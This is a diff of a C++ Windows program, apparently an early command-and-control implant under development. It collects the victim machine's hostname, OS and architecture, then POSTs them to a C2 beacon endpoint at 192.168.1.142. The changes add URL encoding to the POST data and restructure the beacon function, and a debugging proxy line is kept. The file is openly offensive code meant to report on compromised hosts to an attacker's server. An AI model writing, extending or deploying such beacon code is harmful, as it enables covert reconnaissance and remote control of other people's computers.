@@ -1,29 +1,30 @@
 #include <iostream>
 #include <string>
-#include "stdafx.h"				// WinHttpClient
-#include "WinHttpClient.h"		// WinHttpClient
+#include "stdafx.h" // WinHttpClient
+#include "WinHttpClient.h" // WinHttpClient
+
 
 
 // Function prototypes
-wstring beacon(wstring beaconURL);
+wstring beacon(wstring &beaconURL);
 wstring getHostname();
 wstring getOS();
 wstring getArchitecture();
+string utf8Encode(const wstring &postData);
+string urlEncode(const string &unencoded);
+
 
 
 // Start of main() function
 int main()
 {
-	wstring beaconURL = L"https://192.168.1.142/beacon.php";
+	wstring beaconURL = L"https://192.168.1.142/beacon.php"; // **** Needs changed ****
+	beacon(beaconURL); // Beacons
 
-	wcout << getHostname() << endl;
-	wcout << getOS() << endl;
-	wcout << getArchitecture() << endl;
-	beacon(beaconURL);
-	
 	return 0;
 }
 // End of main() function
+
 
 
 // Gets the system hostname - Working as of 06/06/16
@@ -38,6 +39,7 @@ wstring getHostname()
 	return hostname; // Returns the "hostname" wstring to the calling function
 }
 // End of getHostname() function
+
 
 
 // Gets the system OS - Working as of 06/06/16
@@ -62,11 +64,12 @@ wstring getOS()
 // End of getOS() function
 
 
+
 // Gets the system architecture - Working as of 06/06/16 - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
 // Returns "architecture" wstring
 wstring getArchitecture()
 {
-	wstring architecture = L""; // Creates "architecture" wstring
+	wstring architecture; // Creates "architecture" wstring
 	BOOL exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists
 
 	if (exists == TRUE) // If true, then the system architecture is x64
@@ -79,34 +82,60 @@ wstring getArchitecture()
 // End of getArchitecture() function
 
 
+
 // Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
 // Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
 // Returns UTF-8 "out" string
-string UTF8Encode(const wstring &wstr)
+string utf8Encode(const wstring &postData)
 {
-	string out = "";
-	int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), NULL, 0, NULL, NULL);
+	string out;
+	int len = WideCharToMultiByte(CP_UTF8, 0, postData.c_str(), postData.length(), NULL, 0, NULL, NULL);
 	if (len > 0)
 	{
 		out.resize(len);
-		WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), &out[0], len, NULL, NULL);
+		WideCharToMultiByte(CP_UTF8, 0, postData.c_str(), postData.length(), &out[0], len, NULL, NULL);
 	}
 	return out; // Returns UTF-8 string to the calling function
 }
-// End of UTF8Encode() function
+// End of utf8Encode() function
 
 
-// Beacons over HTTPS to the specified C2 server
-// Returns "response" wstring
-wstring beacon(wstring beaconURL)
+
+// Code modified from http://www.zedwood.com/article/cpp-urlencode-function - Working as of 06/07/16
+// Takes a string and URL encodes it
+// Returns URL-encoded "encoded" string
+string urlEncode(const string &unencoded)
 {
-	WinHttpClient beacon(beaconURL);
+	const string unreserved = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~"; // Unreserved characters per RFC
+	string encoded;
+
+	for (size_t i = 0; i < unencoded.length(); i++) // Loops through all characters
+	{
+		if (unreserved.find_first_of(unencoded[i]) != string::npos)
+			encoded.push_back(unencoded[i]);
+		else
+		{
+			encoded.append("%");
+			char buf[3];
+			sprintf_s(buf, "%.2X", unencoded[i]);
+			encoded.append(buf);
+		}
+	}
+	return encoded; // Returns URL-encoded string
+}
+// End of urlEncode() function
+
+
+
+// Beacons to the specified C2 server
+// Returns "response" wstring
+wstring beacon(wstring &beaconURL)
+{
+	WinHttpClient beacon(beaconURL); // New WinHttpClient instance
 
 	beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
 
-	// ** NEED TO ADD IN URL ENCODING FOR THE POST PARAMETERS BELOW **
-
-	string data = "hostname=" + UTF8Encode(getHostname()) + "&os=" + UTF8Encode(getOS()) + "&architecture=" + UTF8Encode(getArchitecture()); // POST data
+	string data = "hostname=" + urlEncode(utf8Encode(getHostname())) + "&os=" + urlEncode(utf8Encode(getOS())) + "&architecture=" + urlEncode(utf8Encode(getArchitecture())); // URL-encoded POST data
 	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());
 
 	wstring contentLength = to_wstring(data.length()); // We need to create new wstring for the Content-Length so we can append to the other headers
